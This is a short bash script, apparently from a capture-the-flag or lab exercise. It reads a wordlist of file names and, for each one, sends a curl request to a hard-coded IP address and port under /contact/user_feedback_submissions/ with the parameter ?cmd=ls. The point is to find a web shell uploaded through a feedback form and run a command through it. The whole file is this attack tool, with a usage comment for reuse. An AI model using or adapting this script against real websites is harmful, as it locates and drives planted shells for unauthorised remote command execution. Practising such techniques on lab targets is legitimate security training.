#!/bin/bash
#usage: supply your filename wordlist with the execution of this script. It replaces each line with $line 
#./repeat.sh wordlist.txt

input=$1
while IFS= read -r line
do
        echo 'doing' $line':'
        curl -I http://94.237.56.188:38103/contact/user_feedback_submissions/$line?cmd=ls
done < "$input"

